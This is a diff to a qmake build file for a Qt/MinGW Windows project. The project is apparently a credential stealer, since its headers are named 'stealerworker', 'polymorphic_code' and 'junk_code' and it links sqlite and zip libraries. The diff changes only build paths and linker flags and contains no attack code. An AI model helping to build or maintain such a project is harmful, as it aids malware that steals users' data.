@@ -7,6 +7,9 @@ TEMPLATE = app
 # Конфигурация для релиза (динамическая сборка Qt)
 CONFIG += release
 
+# Указываем спецификацию для MinGW
+QMAKE_SPEC = win32-g++
+
 # Исходные файлы
 SOURCES += \
     $$PWD/../src/main.cpp \
@@ -19,7 +22,7 @@ HEADERS += \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h \
     $$PWD/../src/stealerworker.h \
-    $$PWD/../src/compat.h  # Добавляем compat.h
+    $$PWD/../src/compat.h
 
 # Формы Qt Designer
 FORMS += \
@@ -32,11 +35,15 @@ RC_FILE = $$PWD/../icon.rc
 INCLUDEPATH += \
     $$PWD/../src \
     $$PWD \
-    C:/vcpkg/installed/x64-mingw-static/include \
+    C:/vcpkg/installed/x64-mingw-dynamic/include \
     C:/Qt/5.15.2/mingw81_64/include
 
+# Пути для поиска QML-модулей
+QML_IMPORT_PATH += \
+    C:/Qt/5.15.2/mingw81_64/qml
+
 # Библиотеки для линковки
-LIBS += -LC:/vcpkg/installed/x64-mingw-static/lib \
+LIBS += -LC:/vcpkg/installed/x64-mingw-dynamic/lib \
         -lsqlite3 \
         -lzip \
         -lz \
@@ -80,9 +87,8 @@ QMAKE_CXXFLAGS += -O2 \
 
 # Флаги линковщика
 QMAKE_LFLAGS += -O2 \
-                -Wl,-s \
                 -Wl,-subsystem,windows \
-                -mthreads
+                -Wl,--allow-multiple-definition
 
 # Директории для сборки
 DESTDIR = $$PWD/../build/release
@@ -124,5 +130,5 @@ PRE_TARGETDEPS += \
     $$PWD/../src/polymorphic_code.h \
     $$PWD/../src/junk_code.h \
     $$PWD/../src/stealerworker.h \
-    $$PWD/../src/compat.h \  # Добавляем compat.h в зависимости
+    $$PWD/../src/compat.h \
     $$UI_DIR/ui_mainwindow.h
